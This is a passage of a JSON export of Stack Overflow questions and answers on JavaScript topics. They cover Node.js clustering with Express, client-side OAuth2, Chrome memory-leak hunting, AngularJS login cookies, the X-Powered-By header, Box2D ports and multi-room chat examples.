            "body": "<p>\u2014 I built a simple app that pulls in data (50 items) from a Redis DB and throws it up at localhost. I did an ApacheBench (c = 100, n = 50000) and I'm getting a semi-decent 150 requests/sec on a dual-core T2080 @ 1.73GHz (my 6 y.o laptop), but the proc usage is very disappointing as shown:\n<img src=\"http://i.stack.imgur.com/zuaIJ.png\" alt=\"enter image description here\"></p>\n\n<p>Only one core is used, which is as per design in Node, but I think I can nearly double my requests/sec to ~300, maybe even more, if I can use Node.js clusters. I fiddled around quite a bit but I haven't been able to figure out how to put the <a href=\"http://nodejs.org/docs/latest/api/cluster.html\">code given here</a> for use with my app which is listed below:</p>\n\n<pre><code>var \n    express = require( 'express' ),\n    app     = express.createServer(),\n    redis   = require( 'redis' ).createClient();\n\napp.configure( function() {\n    app.set( 'view options', { layout: false } );\n    app.set( 'view engine', 'jade' );\n    app.set( 'views', __dirname + '/views' );\n    app.use( express.bodyParser() );\n} );\n\nfunction log( what ) { console.log( what ); }\n\napp.get( '/', function( req, res ) {\n    redis.lrange( 'items', 0, 50, function( err, items ) {\n            if( err ) { log( err ); } else {\n                res.render( 'index', { items: items } );\n            }\n    });\n});\n\napp.listen( 8080 );\n</code></pre>\n\n<p>I also want to emphasize that the app is I/O intensive (not CPU-intensive, which would've made something like <a href=\"http://github.com/xk/node-threads-a-gogo\">threads-a-gogo</a> a better choice than clusters).</p>\n\n<p>Would love some help in figuring this out.</p>\n",
            "last_activity_date": 1337428188,
            "question_id": 10663809,
            "score": 24,
            "tags": [
                "javascript",
                "node.js",
                "redis",
                "express",
                "cluster-computing"
            ],
            "title": "How do I use Node.js clusters with my simple Express app?"
        },
        {
            "answer_count": 2,
            "answers": [
                {
                    "body": "<p>There's an example of <code>Authorization Code Grant</code> approach to get a token from OAuth server. I used jQuery (<code>$</code>) to make some operations.</p>\n\n<p>First, redirect user to authorization page.</p>\n\n<pre><code>var authServerUri = \"http://your-aouth2-server.com/authorize\",\nauthParams = {\n  response_type: \"code\",\n  client_id: this.model.get(\"clientId\"),\n  redirect_uri: this.model.get(\"redirectUri\"),\n  scope: this.model.get(\"scope\"),\n  state: this.model.get(\"state\")\n};\n\n// Redirect to Authorization page.\nvar replacementUri = authServerUri + \"?\" + $.param(authParams);\nwindow.location.replace(replacementUri);\n</code></pre>\n\n<p>When one gave authorization pass to get token:</p>\n\n<pre><code>var searchQueryString = window.location.search;\nif ( searchQueryString.charAt(0) === \"?\") {\n  searchQueryString = searchQueryString.substring(1);\n}\nvar searchParameters = $.deparam.fragment(searchQueryString);\n\nif ( \"code\" in searchParameters) {\n  // TODO: construct a call like in previous step using $.ajax() to get token.\n}\n</code></pre>\n\n<p>You could implement the <code>Resource Owner Password Credentials Grant</code> in the same manner using jQuery or pure XMLHttpRequest and don't make any redirects - because on each redirect you'll loose state of your application.</p>\n\n<p>For me, I used HTML5 local storage to persist state of my application for data which were not likely to pose a security threat.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>The <a href=\"https://tools.ietf.org/html/draft-ietf-oauth-v2-30#section-1.3.2\">Implicit Grant flow</a> (the one you're referring to as <em>User-Agent Flow</em>) is exactly the way to go:</p>\n\n<blockquote>\n  <p>The implicit grant is a simplified authorization code flow optimized for clients implemented in a browser using a scripting language such as JavaScript.</p>\n</blockquote>\n\n<p>To understand the flow, the documentation from Google for <a href=\"https://developers.google.com/accounts/docs/OAuth2#clientside\">client-side applications</a> is a really good place to start. Note that they recommend you to take an additional <em>token validation</em> step to avoid <a href=\"https://en.wikipedia.org/wiki/Confused_deputy_problem\">confused deputy problems</a>.</p>\n\n<p>Here is a short example implementation of the flow using the Soundcloud API and jQuery, taken from <a href=\"http://stackoverflow.com/a/4287248/1467115\">this answer</a>:</p>\n\n<pre><code>&lt;script type=\"text/javascript\" charset=\"utf-8\"&gt;\n  $(function () {\n    var extractToken = function(hash) {\n      var match = hash.match(/access_token=([\\w-]+)/);\n      return !!match &amp;&amp; match[1];\n    };\n\n    var CLIENT_ID = YOUR_CLIENT_ID;\n    var AUTHORIZATION_ENDPOINT = \"https://soundcloud.com/connect\";\n    var RESOURCE_ENDPOINT = \"https://api.soundcloud.com/me\";\n\n    var token = extractToken(document.location.hash);\n    if (token) {\n      $('div.authenticated').show();\n\n      $('span.token').text(token);\n\n      $.ajax({\n          url: RESOURCE_ENDPOINT\n        , beforeSend: function (xhr) {\n            xhr.setRequestHeader('Authorization', \"OAuth \" + token);\n            xhr.setRequestHeader('Accept',        \"application/json\");\n          }\n        , success: function (response) {\n            var container = $('span.user');\n            if (response) {\n              container.text(response.username);\n            } else {\n              container.text(\"An error occurred.\");\n            }\n          }\n      });\n    } else {\n      $('div.authenticate').show();\n\n      var authUrl = AUTHORIZATION_ENDPOINT + \n        \"?response_type=token\" +\n        \"&amp;client_id=\"    + clientId +\n        \"&amp;redirect_uri=\" + window.location;\n\n      $(\"a.connect\").attr(\"href\", authUrl);\n    }\n  });\n&lt;/script&gt;\n&lt;style&gt;\n  .hidden {\n    display: none;\n  }\n&lt;/style&gt;\n\n&lt;div class=\"authenticate hidden\"&gt;\n  &lt;a class=\"connect\" href=\"\"&gt;Connect&lt;/a&gt;\n&lt;/div&gt;\n\n&lt;div class=\"authenticated hidden\"&gt;\n  &lt;p&gt;\n    You are using token\n    &lt;span class=\"token\"&gt;[no token]&lt;/span&gt;.\n  &lt;/p&gt;\n\n  &lt;p&gt;\n    Your SoundCloud username is\n    &lt;span class=\"user\"&gt;[no username]&lt;/span&gt;.\n  &lt;/p&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>For sending <a href=\"https://en.wikipedia.org/wiki/XMLHttpRequest\">XMLHttpRequests</a> (what the <code>ajax()</code> function does in jQuery) using AngularJS, refer to their documentation of the <a href=\"http://docs.angularjs.org/api/ng.%24http\"><code>$http</code> service</a>.</p>\n\n<p>If you want to preserve state, when sending the user to the authorization endpoint, check out the <a href=\"https://tools.ietf.org/html/draft-ietf-oauth-v2-30#section-4.2.1\"><code>state</code></a> parameter.</p>\n",
                    "is_accepted": true,
                    "score": 27
                }
            ],
            "body": "<p>I'm in the process of designing an API in PHP that will use OAuth2.0. My end goal is to build a front-end application in javascript (using AngularJS) that accesses this API directly. I know that traditionally there's no way to secure transactions in javascript and so directly accessing an API isn't feasible. The front-end would need to communicate with server code that in turn communicated with the API directly. However, in researching OAuth2 it looks as if the User-Agent Flow is designed to help in this situation.</p>\n\n<p>What I need help with is implementing the OAuth2 User-Agent Flow in javascript (particularly AngularJS if possible as that's what I'm using for my front-end). I haven't been able to find any examples or tutorials that do this. I really have no idea where to start and don't want to read through the entire OAuth2 spec without at least seeing an example of what I'll be looking at doing. So any examples, tutorials, links, etc would be greatly appreciated.</p>\n",
            "last_activity_date": 1363604414,
            "question_id": 11440398,
            "score": 20,
            "tags": [
                "javascript",
                "api",
                "oauth-2.0",
                "angularjs",
                "consumer"
            ],
            "title": "How do I implement secure OAuth2 consumption in Javascript?"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>Here is a very good post about how to find memory leaks using the Google Developper Tools: <a href=\"http://gent.ilcore.com/2011/08/finding-memory-leaks.html\" rel=\"nofollow\">http://gent.ilcore.com/2011/08/finding-memory-leaks.html</a></p>\n\n<p>Here is another good web page about that : <a href=\"http://javascript.crockford.com/memory/leak.html\" rel=\"nofollow\">http://javascript.crockford.com/memory/leak.html</a></p>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>Google open sourced a tool for this purpose, <a href=\"https://code.google.com/p/leak-finder-for-javascript/\">leak-finder-for-javascript</a>. They also proposed a method so-called the <a href=\"https://docs.google.com/presentation/d/1wUVmf78gG-ra5aOxvTfYdiLkdGaR9OhXRnOlIcEmu2s/pub?start=false&amp;loop=false&amp;delayms=3000#slide=id.g1d65bdf6_0_0\">three snapshot technique</a> (also see a brief description in <a href=\"http://coding.smashingmagazine.com/2012/11/05/writing-fast-memory-efficient-javascript/\">this article</a>).</p>\n",
                    "is_accepted": true,
                    "score": 8
                },
                {
                    "body": "<p>In Chrome developer tools, there is a Timeline - Memory tab:</p>\n\n<p><img src=\"http://i.stack.imgur.com/6zHFc.png\" alt=\"enter image description here\"></p>\n\n<p>We can watch the memory occupied by it.</p>\n\n<p>There is also Profiles - Memory, where we can take a snapshot and see what\u2019s inside. Snapshots can be compared to each other:</p>\n\n<p><img src=\"http://i.stack.imgur.com/EpvmK.png\" alt=\"enter image description here\"></p>\n\n<p>Most of time, it doesn\u2019t tell you anything. But at least you can see which objects are piling up, and probably the structure of the leak.</p>\n\n<p>Other way is using <code>'Task Manager'</code>\nhere is an article regarding this:</p>\n\n<p><a href=\"http://www.javascriptkit.com/javatutors/closuresleak/\">http://www.javascriptkit.com/javatutors/closuresleak/</a></p>\n",
                    "is_accepted": false,
                    "score": 12
                },
                {
                    "body": "<p>I found this article very insightful: </p>\n\n<p><a href=\"http://addyosmani.com/blog/taming-the-unicorn-easing-javascript-memory-profiling-in-devtools/\" rel=\"nofollow\">http://addyosmani.com/blog/taming-the-unicorn-easing-javascript-memory-profiling-in-devtools/</a></p>\n\n<p>It does cover the chrome developer tools extensively and explains very well how to go about when your application seems to have memory issues.</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I have struggled around with the heap profiler in chrome but is it very confusing. Especially if there are minimized libraries inside. But event the DOMElements views, elements which may not removed are very unclear presented.</p>\n\n<p>Are there any tips how use the heap dump in chrome to find JS code that leads to memory leaks, code that cannot cleaned by GC... and how to find elements messing around even if removed from dom?</p>\n\n<p>In other words, how to read heap dump in chrome correctly? Dominators View? Comparison?</p>\n",
            "last_activity_date": 1405418006,
            "question_id": 15970525,
            "score": 19,
            "tags": [
                "javascript",
                "google-chrome"
            ],
            "title": "How to find JS Memory Leaks?"
        },
        {
            "answer_count": 3,
            "answers": [
                {
                    "body": "<p>You can create an directive that set up the logged user when the application loads, for example, requesting the current user session on your server.</p>\n\n<pre><code>angular.module('Auth', [\n        'ngCookies'\n    ])\n    .factory('Auth', ['$cookieStore', function ($cookieStore) {\n\n        var _user = {};\n\n        return {\n\n            user : _user,\n\n            set: function (_user) {\n                // you can retrive a user setted from another page, like login sucessful page.\n                existing_cookie_user = $cookieStore.get('current.user');\n                _user =  _user || existing_cookie_user;\n                $cookieStore.put('current.user', _user);\n            },\n\n            remove: function () {\n                $cookieStore.remove('current.user', _user);\n            }\n        };\n    }])\n;\n</code></pre>\n\n<p>And set in your <code>run</code> method in <code>AppController</code>:</p>\n\n<pre><code>   .run(['Auth', 'UserRestService', function run(Auth, UserRestService) {\n\n            var _user = UserRestService.requestCurrentUser();\n            Auth.set(_user);\n        }])\n</code></pre>\n\n<p>Of course if any request to the server return an <code>Http Status 401 - Unauthorized</code>, you need to call the <code>Auth.remove()</code> service to remove the user from cookie and redirect the user to login page.</p>\n\n<p>I use this approach and works very well. You can also use the <code>localStorage</code>, but the user data will be persisted for a long time. Unless you set an expiration date for this authentication, I don't see as best practice.</p>\n\n<p>Keep in mind to always verify the user credentials on your server site =)</p>\n\n<p><strong>[EDIT]</strong></p>\n\n<p>To listen to <code>401 - Unauthorized</code> server response, you can put an interceptor on your <code>$http</code> request, like this:</p>\n\n<pre><code> .config(['$urlRouterProvider', '$routeProvider', '$locationProvider', '$httpProvider', function ($urlRouterProvider, $routeProvider, $locationProvider, $httpProvider) {\n        $urlRouterProvider.otherwise('/home');\n        var interceptor = ['$location', '$q', function ($location, $q) {\n\n            function success(response) {\n                return response;\n            }\n\n            function error(response) {\n\n                if (response.status === 401) {\n                    $location.path('/login');\n                    return $q.reject(response);\n                }\n                else {\n                    return $q.reject(response);\n                }\n            }\n\n            return function (promise) {\n                return promise.then(success, error);\n            };\n        }];\n\n        $httpProvider.responseInterceptors.push(interceptor);\n    }])\n</code></pre>\n\n<p>Every call with <code>401</code> response, the user will be redirected to login page at <code>/login</code> path.</p>\n\n<p>You will find a good example <a href=\"http://www.frederiknakstad.com/authentication-in-single-page-applications-with-angular-js/\">here</a></p>\n",
                    "is_accepted": true,
                    "score": 25
                },
                {
                    "body": "<p>You can set the cookie on your login callback with</p>\n\n<pre><code>$cookieStore.put('logged-in', some_value)\n</code></pre>\n\n<p>Then check for it when they enter your site with</p>\n\n<pre><code>.run(function($cookieStore) {\n    if ($cookieStore.get('logged-in') === some_value) {\n        let him enter\n    }\n    else {\n        you shall not pass\n    }\n});\n</code></pre>\n\n<p>There might be more \"correct\" ways, but this works. </p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>If you're having problems making the accepted answer work, be wary, that as of Angular 1.3, a proper way of adding a new interceptor is by adding it to $httpProvider.interceptors, so instead of:</p>\n\n<pre><code>$httpProvider.responseInterceptors.push(interceptor);\n</code></pre>\n\n<p>use:</p>\n\n<pre><code>$httpProvider.interceptors.push(interceptor);\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>Right now I am building an AngularJS based application on top of Ruby on Rails and using Devise for authentication. I have the server responding properly when a user authenticates successfully and when authentication fails. I guess my question is, using $cookieStore, what's the best practice for knowing if a user is logged in or not? There is a cookie that gets set by Rails called \"myapp_session\", but that session doesn't necessarily mean a user is logged in. Looking for ideas on how to use AngularJS to keep user online/offline management. I'll still be ensuring that requests that require authorization get authorized by the backend regardless of the solution.</p>\n",
            "last_activity_date": 1418394219,
            "question_id": 17982868,
            "score": 10,
            "tags": [
                "javascript",
                "ruby-on-rails",
                "cookies",
                "angularjs"
            ],
            "title": "AngularJS: best practice for ensure user is logged in or out using cookieStore"
        },
        {
            "answer_count": 7,
            "answers": [
                {
                    "body": "<p>Reading the code <a href=\"https://github.com/visionmedia/express/blob/master/lib/http.js#L72\" rel=\"nofollow\">https://github.com/visionmedia/express/blob/master/lib/http.js#L72</a> makes me think that you will have to live with it since it doesn't seem to be conditional.</p>\n\n<p>If you have an nginx/apache frontend you can still remove the header with it (with mod_headers for apache and headers-more for nginx)</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>In Express >= 3.0.0rc5:</p>\n\n<pre><code>app.disable('x-powered-by');\n</code></pre>\n\n<p>Here is a simple middleware that removes the header in earlier versions of Express:</p>\n\n<pre><code>app.use(function (req, res, next) {\n  res.removeHeader(\"x-powered-by\");\n  next();\n});\n</code></pre>\n",
                    "is_accepted": true,
                    "score": 106
                },
                {
                    "body": "<p>removeHeader will work only in route middleware, coffeescript example</p>\n\n<pre><code>fix_headers =  (req, res, next) -&gt;\n    res.removeHeader 'X-Powered-By'\n    next()\n\napp.get '/posts', fix_headers, (req, res, next) -&gt;\n  ...\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Just to piggy-back on rjack's answer, you could also (optionally) just change (set) the X-powered-by header to something much cooler/custom like this:</p>\n\n<pre><code>app.use(function (req, res, next) {\n  res.header(\"X-powered-by\", \"Blood, sweat, and tears\")\n  next()\n})\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 17
                },
                {
                    "body": "<p>Maybe this could be obvious to the more seasoned Express users, but only this worked for me:</p>\n\n<pre><code>app.configure(function() {\n    app.use(function (req, res, next) {\n        res.removeHeader(\"X-Powered-By\");\n        next();\n    });\n});\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 3
                },
                {
                    "body": "<p>As of Express v3.0.0rc5, support for disabling the <code>X-Powered-By</code> header is built in:</p>\n\n<pre><code>var express = require('express');\n\nvar app = express();\napp.disable('x-powered-by');\n</code></pre>\n",
                    "is_accepted": false,
                    "score": 27
                },
                {
                    "body": "<p>Here's a handy middleware you can drop in to swap out X-Powered-By:</p>\n\n<pre><code>function customHeaders( req, res, next ){\n  // Switch off the default 'X-Powered-By: Express' header\n  app.disable( 'x-powered-by' );\n\n  // OR set your own header here\n  res.setHeader( 'X-Powered-By', 'Awesome App v0.0.1' );\n\n  // .. other headers here\n\n  next()\n}\n\napp.use( customHeaders );\n\n// ... now your code goes here\n</code></pre>\n\n<p>Setting X-Powered by in this case would override the default 'Express', so you do not need to both disable AND set a new value.</p>\n",
                    "is_accepted": false,
                    "score": 6
                }
            ],
            "body": "<p>I am running a server on nodejs with express. I can't seem to get rid of the header:</p>\n\n<pre><code>X-Powered-By:Express\n</code></pre>\n\n<p>I was wondering if there is any way to get rid of this header or do I have to live with it?</p>\n",
            "last_activity_date": 1357286021,
            "question_id": 5867199,
            "score": 78,
            "tags": [
                "javascript",
                "node.js",
                "http-headers",
                "express"
            ],
            "title": "Can&#39;t get rid of header X-Powered-By:Express"
        },
        {
            "answer_count": 5,
            "answers": [
                {
                    "body": "<blockquote>\n  <p><strong><em>Note to readers!</em></strong></p>\n  \n  <p>This question was originally asked and answered in 2011, but I'll do my best to keep it up to date!</p>\n</blockquote>\n\n<p>Here's what I've found:</p>\n\n<ul>\n<li><strong><a href=\"https://github.com/kripken/box2d.js\" rel=\"nofollow\">kripken/box2d.js</a> is a port of Box2D using Emscripten and works well. Start with this.</strong></li>\n<li>Box2DJS is a port of Box2DFlash 1.4.3.1. box2dweb is a port of version 2.1a.</li>\n<li>Box2DJS works \"as a CommonJS module without any modifications at all\" <a href=\"http://cocos2d-javascript.org/2011/Jan/20/box2d-module-changed\" rel=\"nofollow\">[1]</a></li>\n<li>Box2DJS \"not up-to-date and you have to import a big amount of JavaScript files in every project\" <a href=\"http://code.google.com/p/box2dweb/\" rel=\"nofollow\">[2]</a></li>\n<li>box2dweb is contained in a single file <a href=\"http://code.google.com/p/box2dweb/\" rel=\"nofollow\">[2]</a></li>\n<li>box2dweb is \"a much newer port and has a lot fewer issues\" than Box2DJS <a href=\"http://gamedev.stackexchange.com/questions/7765/are-there-any-alternative-js-ports-of-box2d\">[3]</a>. However, switching might introduce new issues <a href=\"http://www.banditracer.eu/index.php?mact=News,cntnt01,print,0&amp;cntnt01articleid=5&amp;cntnt01showtemplate=false&amp;cntnt01returnid=58\" rel=\"nofollow\">[4]</a>.</li>\n<li>Box2DJS depends on Prototype but box2dweb does not <a href=\"http://www.box2d.org/forum/viewtopic.php?f=22&amp;t=6590\" rel=\"nofollow\">[5]</a></li>\n<li>Seth Ladd has promoted box2dweb with examples on his blog <a href=\"http://blog.sethladd.com/2011/09/box2d-javascript-example-walkthrough.html\" rel=\"nofollow\">[6]</a></li>\n<li>Nobody seems to be using the third alternative.</li>\n</ul>\n\n<p>There's also <a href=\"http://gamedev.stackexchange.com/questions/7765/are-there-any-alternative-js-ports-of-box2d\">a similar discussion on gamedev.stackexchange.com</a>.</p>\n\n<p>I'd say that the winner is kripken/box2d.js.</p>\n",
                    "is_accepted": true,
                    "score": 52
                },
                {
                    "body": "<p>This question and its best answer are from 2011. One recent new option is <a href=\"https://github.com/kripken/box2d.js/\">box2.js</a>, an Emscripten translation of the C++ code to Javascript. As of August 2013 it's more up-to-date than the other ports I've found, and the demos seem to work.</p>\n",
                    "is_accepted": false,
                    "score": 9
                },
                {
                    "body": "<p>Probably the best place to keep up to date with Box2D JavaScript ports is the official forum: <a href=\"http://box2d.org/forum/viewforum.php?f=22\" rel=\"nofollow\">http://box2d.org/forum/viewforum.php?f=22</a></p>\n\n<p><strong>JSBox2D</strong> looks like a good start.</p>\n\n<p>I would definitely have a look into <strong>Matter.js</strong>, which seems very well built and very quick. I'm going down this path. <a href=\"http://brm.io/matter-js\" rel=\"nofollow\">http://brm.io/matter-js</a></p>\n",
                    "is_accepted": false,
                    "score": 4
                },
                {
                    "body": "<p>Box2DWeb supports most of the API from the original C++ Box2D except chain shapes. :/</p>\n\n<p>It is the most widely used Javascript Box2D. If you need the API documentation for Box2DWeb, check out Box2DFlash. <a href=\"http://www.box2dflash.org/docs/2.1a/reference/\" rel=\"nofollow\">http://www.box2dflash.org/docs/2.1a/reference/</a></p>\n\n<p>Box2DWeb is auto generated from Box2DFlash using a compiler. So the API is the same.</p>\n\n<p>I doubt Box2DWeb will get any update in the future anymore as Box2DFlash has shown no activities anymore. You can see the author's rational on why he decided not to write a direct Box2D --> Box2DWeb port.</p>\n\n<p><a href=\"https://code.google.com/p/box2dweb/wiki/Roadmap\" rel=\"nofollow\">https://code.google.com/p/box2dweb/wiki/Roadmap</a></p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p><strong>LiquidFun (With JS Bindings)</strong></p>\n\n<p>LiquidFun is, at the time I'm posting this, the most recent port to JS. It has all the features of Box2D and liquid physics features. It's ported using emscripten, so performance is decent.</p>\n\n<p><a href=\"https://github.com/google/liquidfun\" rel=\"nofollow\">google/liquidfun</a></p>\n\n<p><a href=\"https://github.com/google/liquidfun/tree/master/liquidfun/Box2D/lfjs\" rel=\"nofollow\">google/liquidfun/tree/master/liquidfun/Box2D/lfjs</a></p>\n",
                    "is_accepted": false,
                    "score": 3
                }
            ],
            "body": "<p>There are a few different ports of <a href=\"http://box2d.org/\" rel=\"nofollow\">Box2D</a> for JavaScript. Which one is the best?</p>\n\n<ul>\n<li><p><strong><a href=\"http://box2d-js.sourceforge.net/\" rel=\"nofollow\">Box2DJS</a></strong> - \"converted from Box2DFlashAS3_1.4.3.1 in an automatic manner\" </p></li>\n<li><p><strong><a href=\"http://29a.ch/2010/4/17/box2d-2-flash-ported-javascript\" rel=\"nofollow\">Box2Dflash 2.0 ported to JavaScript</a></strong> - \"one big nasty hack that just happens to work\"</p></li>\n<li><p><strong><a href=\"http://code.google.com/p/box2dweb/\" rel=\"nofollow\">box2dweb</a></strong> - \"a port of Box2DFlash 2.1a to JavaScript. I developed an ActionScript 3 -to- JavaScript converter to generate the code\"</p></li>\n<li><p><strong><a href=\"https://github.com/HBehrens/box2d.js\" rel=\"nofollow\">HBehrens/box2d.js</a></strong> - \"a JavaScript Version of Box2D 2.1a\" (Added Nov 21, 2011)</p></li>\n<li><p><strong><a href=\"https://github.com/kripken/box2d.js/\" rel=\"nofollow\">kripken/box2d.js</a></strong> - \"a direct port of the Box2D 2D physics engine to JavaScript, using Emscripten\" (Added Sep 24, 2013)</p></li>\n</ul>\n\n<p>Any ideas which version <a href=\"http://chrome.angrybirds.com/\" rel=\"nofollow\">http://chrome.angrybirds.com/</a> uses, if any?</p>\n",
            "last_activity_date": 1418079224,
            "question_id": 7628078,
            "score": 56,
            "tags": [
                "javascript",
                "box2d"
            ],
            "title": "Which Box2D JavaScript library should I use?"
        },
        {
            "answer_count": 9,
            "answers": [
                {
                    "body": "<p>You can take a look at <a href=\"http://orbited.org/\" rel=\"nofollow\">http://orbited.org/</a> running STOMP protocol (http://stomp.codehaus.org/Home). It has channel support (your rooms). So you just need to send some JSON encoded messages carrying user's nicknames to a channel. I'm not sure how to get the list of channels, might be that you need to track these yourself.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>I can't quickly answer your question, but I know a couple of open source web chats that have this kind of features: </p>\n\n<ul>\n<li><a href=\"http://blog.jwchat.org/jwchat/\" rel=\"nofollow\">http://blog.jwchat.org/jwchat/</a> </li>\n<li><a href=\"http://www.ijab.im/\" rel=\"nofollow\">http://www.ijab.im/</a></li>\n<li><a href=\"http://sourceforge.net/projects/webjabber/\" rel=\"nofollow\">http://sourceforge.net/projects/webjabber/</a></li>\n<li><a href=\"http://www.claros.org/\" rel=\"nofollow\">http://www.claros.org/</a></li>\n</ul>\n\n<p>Maybe you'll find what you are looking for</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>There is a really nice <a href=\"http://www.web2media.net/laktek/2010/05/04/implementing-web-socket-servers-with-node-js/\" rel=\"nofollow\">tutorial by laktek</a> that shows how to use websockets with node.js.\nHe has also a colaborative code editor that uses <a href=\"http://code.google.com/p/redis/\" rel=\"nofollow\">redis</a> as a backend of a pub/sub service \n<a href=\"http://www.web2media.net/laktek/2010/05/25/real-time-collaborative-editing-with-websockets-node-js-redis/\" rel=\"nofollow\">described here</a> </p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>There is <a href=\"https://gist.github.com/a3d0bbbff196af633995\" rel=\"nofollow\">this Gist</a> available from Ryan Dahl the author of Node.JS which is a basic IRC daemon written in Node.JS. It is featured in <a href=\"http://dailyjs.com/2009/12/16/node-irc/\" rel=\"nofollow\">this blog post</a> which describes several IRC related Node.JS programs.\nTogether with websocket this might be an alternative to try out.</p>\n\n<p>The <a href=\"http://chat.nodejs.org/\" rel=\"nofollow\">webchat demo (http://chat.nodejs.org/)</a> hosted on the Node.JS homepage is a complete example and the source code can be found in the <a href=\"http://github.com/ry/node_chat\" rel=\"nofollow\">following GitHub repository</a> and is available under the MIT license.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p><a href=\"http://github.com/maccman/juggernaut\" rel=\"nofollow\">http://github.com/maccman/juggernaut</a>\nThere's this one, only for ruby though.</p>\n",
                    "is_accepted": false,
                    "score": 0
                },
                {
                    "body": "<p>I realized that you have not yet received a solution to your issue yet. Suggest looking at this question where i have provided the answer:</p>\n\n<p><a href=\"http://stackoverflow.com/questions/4445883/node-websocket-server-possible-to-have-multiple-separate-broadcasts-for-a-sin\">node-websocket-server: possible to have multiple, separate &quot;broadcasts&quot; for a single node.js process?</a></p>\n",
                    "is_accepted": true,
                    "score": 5
                },
                {
                    "body": "<p><a href=\"http://wompt.com\" rel=\"nofollow\">Wompt</a> is an node.js multi-room chat server that was recently <a href=\"https://github.com/Wompt/wompt.com\" rel=\"nofollow\">open-sourced</a>.</p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>Socket.io has support for rooms. This link helped me implement them in a matter of seconds.</p>\n\n<p><a href=\"https://github.com/LearnBoost/socket.io/wiki/Rooms\" rel=\"nofollow\">https://github.com/LearnBoost/socket.io/wiki/Rooms</a></p>\n",
                    "is_accepted": false,
                    "score": 1
                },
                {
                    "body": "<p>tested and working great: </p>\n\n<p><a href=\"https://github.com/mmukhin/psitsmike_example_2\" rel=\"nofollow\">https://github.com/mmukhin/psitsmike_example_2</a></p>\n\n<p>(node.js and socket.io multiroom chat tutorial with 17 stars on github)</p>\n",
                    "is_accepted": false,
                    "score": 1
                }
            ],
            "body": "<p>I'm looking for a websocket/node.js chat implementation which supports multiple rooms.</p>\n\n<p>I'm also going to write an app which needs multiple rooms or servers, and I'm just looking for some code samples of how people do it.</p>\n\n<p>Thanks.</p>\n\n<p>I know there's a service <a href=\"http://pusherapp.com\">http://pusherapp.com</a> which provides this service, but I'm looking for an open source example.</p>\n",
            "last_activity_date": 1361808772,
            "question_id": 3409589,
            "score": 54,
            "tags": [
                "javascript",
                "node.js",
                "websocket"
            ],
            "title": "node.js multi room chat example"
        },
        {
            "answer_count": 4,
            "answers": [
                {
                    "body": "<p>I found one which is one of the MS samples for SPAs (which might be the only one for now):</p>\n\n<p><a href=\"http://code.msdn.microsoft.com/ASPNET-Single-Page-d6d7172c\">ASP.NET Single Page Application (SPA) BigShelf</a></p>\n\n<p>The complete tutorial on this project can be found here: <a href=\"http://www.asp.net/single-page-application/spa-samples\">BigShelf</a></p>\n\n<p><strong>Edit:</strong></p>\n\n<p>See this tweet from Steve Sanderson: <a href=\"https://twitter.com/#!/stevensanderson/status/171561402597773312\">https://twitter.com/#!/stevensanderson/status/171561402597773312</a></p>\n\n<blockquote>\n  <p>We're setting up a website for Upshot/SPA right now. Hopefully will go\n  live this week! Sorry for delay.</p>\n</blockquote>\n",
                    "is_accepted": true,
                    "score": 16
                },
                {
                    "body": "<p><strong>Edit: see blog post of Steven over here with sample download code: <a href=\"http://blog.stevensanderson.com/2012/03/06/single-page-application-packages-and-samples/\">http://blog.stevensanderson.com/2012/03/06/single-page-application-packages-and-samples/</a></strong> </p>\n\n<p>Don't know either how to access the helper, would love to know so I can play with it :-)</p>\n\n<p>This seems to do the trick for now: </p>\n\n<pre><code>&lt;script src=\"../../Scripts/knockout-2.0.0.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script src=\"../../Scripts/upshot.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n&lt;script src=\"../../Scripts/upshot.compat.knockout.js\" type=\"text/javascript\"&gt;&lt;/script&gt;\n\n&lt;script type=\"text/javascript\"&gt;\n\n    upshot.metadata({ \"CLASSNAME:#NAMESPACE\":{ \"key\": [\"aId\"],\n        \"fields\": {\n            \"aId\": { \"type\": \"Int32:#System\" }, \n            \"Title\": { \"type\": \"String:#System\" },\n            \"Description\": { \"type\": \"String:#System\" },\n            \"Effort\": { \"type\": \"Double:#System\" }\n            }\n        }\n    });\n\n    var myDataSource = new upshot.RemoteDataSource({\n        providerParameters: {\n            url: \"http://localhost:7018/api/CONTROLLERNAME\",\n            operationName: \"\",\n            operationParameters: {}\n        },\n        entityType: \"CLASSNAME:#NAMESPACE\"\n    });\n            myDataSource.refresh(function (results) {\n                alert(results[0].Title());\n            });\n\n&lt;/script&gt;\n</code></pre>\n\n<p>You need to replace CLASSNAME:#NAMESPACE with your classname and namespace, so for example: \"WorkItem:#MySystem.Models\". </p>\n\n<p>And replace the CONTROLLERNAME with the actual name of the controller, in the case of this</p>\n\n<pre><code>public class MyTasksController : ApiController \n</code></pre>\n\n<p>you will need to replace CONTROLLERNAME with MyTasks</p>\n\n<p>And fill the stuff inside the metadata according to your model objects. I hope the code samples come online soon, because this is a lot of work :-(</p>\n",
                    "is_accepted": false,
                    "score": 8
                },
                {
